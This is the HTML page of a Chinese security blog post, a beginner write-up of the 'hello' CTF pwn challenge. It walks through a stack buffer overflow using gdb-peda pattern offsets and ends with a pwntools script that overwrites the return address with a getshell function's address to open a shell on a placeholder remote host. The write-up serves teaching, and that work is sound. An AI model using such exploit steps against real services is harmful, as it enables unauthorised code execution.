@@ -1,0 +1,557 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过
+题目地址：https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg
+0x00 基本知识首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接放在这里吧，我是链接，这个是百度">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>简单的栈溢出_hello_elf - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="简单的栈溢出_hello_elf">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-09-28 09:12" pubdate>
+        2018年9月28日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      28
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">简单的栈溢出_hello_elf</h1>
+            
+            <div class="markdown-body">
+              <p>最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过</p>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg">https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg</a></p>
+<h2 id="0x00-基本知识"><a href="#0x00-基本知识" class="headerlink" title="0x00 基本知识"></a>0x00 基本知识</h2><p>首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接放在这里吧，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%88%E6%BA%A2%E5%87%BA/8538051?fr=aladdin">我是链接</a>，这个是百度百科上比较通用的解答，如果觉得不清楚还可以自己查阅其他的文章</p>
+<span id="more"></span>
+
+<h2 id="0x01-起手第一步"><a href="#0x01-起手第一步" class="headerlink" title="0x01 起手第一步"></a>0x01 起手第一步</h2><p>首先一般我拿到一个二进制文件的时候会先用<code>file</code>命令看一下文件的类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  1  file hello<br>hello: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=547379e1b7bd695a7546d2a3321e199c0474dfa9, not stripped<br></code></pre></td></tr></table></figure>
+
+<p>这里显示这是一个32位的ELF文件，其实对于新手来说IDA_Pro的一键f5还是挺方便的，我们先把文件放到IDA里看一下：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" srcset="/img/loading.gif" lazyload></p>
+<p>IDA的左侧显示了一些函数的信息，双击函数后再按<code>F5</code>键使IDA显示出伪C代码，这里说是伪C代码是因为这些代码严格意义上不算是C代码，只是IDA为了使程序显示更接近我们的逻辑顺序而显示的一种接近于C语言格式的代码，如果可以通过自己的判断来修复一些伪C代码中的逻辑或者变量名称，可以使得代码接近于源代码，但是我们这道题不涉及修复的知识。</p>
+<p>随便翻看一下这些函数的内容，并在脑海中大致建立一个程序的逻辑框架，看到一个read函数，不知道此函数的作用怎么办，很简单，Linux下自带命令<code>man</code>可与查看函数的手册</p>
+<p>在Linux终端下输入命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure>
+
+<p>此时终端会打印出关于read函数的信息：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9a4e28b52.png" srcset="/img/loading.gif" lazyload></p>
+<p>内容很多，感兴趣的同学可以自己敲一下试试，而我们目前只需关注一下信息：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">NAME<br>       read - read from a file descriptor<br><br>SYNOPSIS<br>       <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要看一下此函数的相关参数，<code>fd</code>我在<a target="_blank" rel="noopener" href="https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/">之前的文章中</a>介绍过了，这个是文件描述符，不同的值代表不同的文件读写状态，0代表标准输入，后面的<code>*buf</code>代表输入的内容的指针，再后面的<code>count</code>是输入的字节数，此时看之前IDA中的伪代码就可以知道此程序会从用户的标准输入中读取64个unsigned整型并将此内容print出来，但是为什么这道题有漏洞呢，因为他读取的是64字节的内容，但是再IDA中显示内容得知程序只为V1开辟了0x16的空间，如图：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" srcset="/img/loading.gif" lazyload> </p>
+<p>这显然是会造成栈溢出的，0x16转换为十进制为22，我们可以来验证一下，我个人比较喜欢用<code>gdb</code>来调试ELF文件，其中<code>gdb</code>中有一个十分好用的插件<code>peda</code>，具体的安装方式网上也有很多的教程，在这里我也不浪费时间了，话不多说，<code>gdb</code>启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  1  gdb hello <br>GNU gdb (Debian 8.1-4) 8.1<br>......<br>此处省略N个字<br>......<br>Reading symbols from hello...(no debugging symbols found)...<span class="hljs-keyword">done</span>.<br>gdb-peda$ checksec <br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br></code></pre></td></tr></table></figure>
+
+<p>先使用<code>checksec</code>来检车一下程序开启的保护措施，可以看到只开启了一个NX，这些保护措施如果不了解没关系，但是第一步<code>checksec</code>是个好习惯。</p>
+<p>我们可以使用<code>r</code>或者<code>run</code>使程序在<code>gdb</code>中运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ r<br>Starting program: /root/0101/1/hello <br>input_test<br>Hello, input_test<br><br>[Inferior 1 (process 4082) exited normally]<br>Warning: not running or target is remote<br></code></pre></td></tr></table></figure>
+
+<p>可以看到程序正常的执行了</p>
+<p>以上我们对此程序的基础信息算是有所掌握了，接下来进行进一步的探索</p>
+<h2 id="0x02-在溢出的边缘疯狂试探"><a href="#0x02-在溢出的边缘疯狂试探" class="headerlink" title="0x02 在溢出的边缘疯狂试探"></a>0x02 在溢出的边缘疯狂试探</h2><p>首先我们已经知道了这个使考察栈溢出的知识了，常见的栈溢出就是程序对用户的输入长度没有进行严格的限制，会导致用户输入的超过程序限制的长度的数据溢出到非预期的位置，从而造成程序逻辑的混乱或者造成软件被破解、<code>getshell</code>等严重的后果，因此我们需要确定一个简单的攻击路线：</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 确定程序存在的漏洞</li>
+<li><input disabled="" type="checkbox"> 确定溢出点</li>
+<li><input disabled="" type="checkbox"> 寻找溢出利用位置</li>
+<li><input disabled="" type="checkbox"> 成功Getshell</li>
+</ul>
+<p>因此我们需要确认一下溢出点的位置，简单来说就是确定当我们输入多少长度的数据的时候程序会产生溢出，<code>gdb</code>有一个很好的命令可以帮助我们很快的找到溢出点的位置，这个命令就是<code>pattern_creat</code>，使用此命令＋想要生成的字符串的长度就可以生成一串特殊的字符串，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_creat 50<br><span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这串字符串每相邻的三位字母都是不同的，因此如果你在其中找到了三个字母如<code>FAA</code>，而这三个字母可以在这个字符串中确定一个唯一的位置。</p>
+<p>我们试一下把这串字符串输入目标程序<code>hello</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ r<br>Starting program: /root/0101/1/hello <br>AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbA<br></code></pre></td></tr></table></figure>
+
+<p>敲击回车，此时会发现终端界面发生变化：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]<br>EAX: 0x3b (<span class="hljs-string">&#x27;;&#x27;</span>)<br>EBX: 0x0 <br>ECX: 0x0 <br>EDX: 0xf7fa7890 --&gt; 0x0 <br>ESI: 0xf7fa6000 --&gt; 0x1d5d8c <br>EDI: 0x0 <br>EBP: 0x2d414143 (<span class="hljs-string">&#x27;CAA-&#x27;</span>)<br>ESP: 0xffffd2c0 (<span class="hljs-string">&quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>EIP: 0x41284141 (<span class="hljs-string">&#x27;AA(A&#x27;</span>)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>Invalid <span class="hljs-variable">$PC</span> address: 0x41284141<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd2c0 (<span class="hljs-string">&quot;ADAA;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0004| 0xffffd2c4 (<span class="hljs-string">&quot;;AA)AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0008| 0xffffd2c8 (<span class="hljs-string">&quot;AAEAAaAA0AAFAAbA\n&quot;</span>)<br>0012| 0xffffd2cc (<span class="hljs-string">&quot;AaAA0AAFAAbA\n&quot;</span>)<br>0016| 0xffffd2d0 (<span class="hljs-string">&quot;0AAFAAbA\n&quot;</span>)<br>0020| 0xffffd2d4 (<span class="hljs-string">&quot;AAbA\n&quot;</span>)<br>0024| 0xffffd2d8 --&gt; 0xa (<span class="hljs-string">&#x27;\n&#x27;</span>)<br>0028| 0xffffd2dc --&gt; 0xf7de99a1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x41284141 <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure>
+
+<p>说明此时程序已经崩溃，报错内容显示EIP中的地址是无效的，终端中显示的三栏依次显示的是程序崩溃时寄存器、错误代码、栈的相关信息，有关每个寄存器的作用在网上也有很多的介绍，我们要关注的是<code>EIP</code>寄存器，这个寄存器存储的是计算机要执行的下一个指令的位置，此时我们发现<code>EIP</code>中显示的是我们刚才输入的字符串中的一部分<code>AA(A</code>，我们先看一下这四个字符在字符串的位置，使用<code>pattern_offset</code>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ pattern_offset AA(A<br>AA(A found at offset: 22<br></code></pre></td></tr></table></figure>
+
+<p>因此我们找到了这个字符串的偏移量为22，换个说法就是说我们输入的字符串在第22位会发生溢出，至此溢出点已被找到</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 确定溢出点</li>
+</ul>
+<p>就是说我们输入的前22个字符会正常的被程序处理，但是多出来的四个字节会覆盖在<code>EIP</code>寄存器中，如果我们把<code>EIP</code>中的内容修改为我们想执行的命令的位置，则可以执行此命令，如果我们想进一步掌控该程序需要寻找我们想执行的指令的位置。</p>
+<h2 id="0x03-寻找目标指令"><a href="#0x03-寻找目标指令" class="headerlink" title="0x03 寻找目标指令"></a>0x03 寻找目标指令</h2><p>其实找到了溢出点之后利用时有很多种方式，但是这个题目只需要我们在程序本身中寻找利用点，我们回到IDA中查看是否有可以利用的指令，然后发现了一个<code>getshell</code>函数：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bade62d7af8c.png" srcset="/img/loading.gif" lazyload></p>
+<p>此函数的地址可以在下图中找到</p>
+<p><img src="https://i.loli.net/2018/09/28/5bade68852d0e.png" srcset="/img/loading.gif" lazyload></p>
+<p>函数的地址为：<code>0804846B</code>如果我们把此<code>getshell</code>函数的入口地址放入<code>EIP</code>那么系统在执行<code>EIP</code>寄存器中的命令的时候就会直接运行<code>system(&quot;/bin/sh&quot;);</code>从而得到一个shell。</p>
+<p>为了更贴近CTF中的情景，我们可以使用<code>socat</code>把此程序的标准<code>io</code>绑定到一个端口上从而实现远程通信：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw<br></code></pre></td></tr></table></figure>
+
+<p><del>端口号可以任意指定但是一定要是空闲端口号（废话）</del></p>
+<p>然后就可以用<code>nc</code>来进行远程通信了如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc x.x.x.x port<br></code></pre></td></tr></table></figure>
+
+<p>python中有一个大名鼎鼎的库叫做<code>pwntools</code>，我们用这个工具来与远程程序进行交互与破解，此库的安装教程网上也有而且不难，这里就不多说了，漏洞利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#连接目标主机，参数为IP和端口</span><br>stream=remote(<span class="hljs-string">&#x27;x.x.x.x&#x27;</span>,<span class="hljs-number">10001</span>)<br><br><span class="hljs-comment">#payload即攻击载荷</span><br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#发送22个A并加上getshell函数的地址</span><br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">22</span>+p32(<span class="hljs-number">0x0804846B</span>)<br><br><span class="hljs-comment">#发送payload</span><br>stream.send(payload)<br><br><span class="hljs-comment">#打开一个shell的交互进程</span><br>stream.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>代码中p32()函数的作用是将函数地址转换为四个字节的字符串，如果不使用此函数直接发送22个A和0x0804846B则会直接发送16进制的字符而不是真正的地址的格式，运行此程序会发现程序由原来返回用户输入的名字变为了一个由交互功能的shell，可以执行用户输入的指令，到这里漏洞利用就算是成功了，当然，这个shell并不是标准的shell，可以利用python打开一个shell的完全体。</p>
+<p><img src="https://i.loli.net/2018/09/28/5badf1bbc1064.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 漏洞利用成功</li>
+</ul>
+<p>我在<code>hello</code>旁边放了一个<code>flag</code>，通过<code>cat flag</code>可以读取<code>flag</code>的内容，至此PWN结束。</p>
+<p>本文章主要面对小白，省去了很多细节以方便理解，如有错误欢迎指正！</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/09/2017%E4%B8%AD%E5%9B%BD%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81%EF%BC%88APT%EF%BC%89%E7%A0%94%E7%A9%B6%E6%8A%A5%E5%91%8A%E8%AF%BB%E5%90%8E%E6%84%9F/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2017中国高级持续性威胁（APT）研究报告读后感</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/">
+                        <span class="hidden-mobile">信息安全学习路径</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
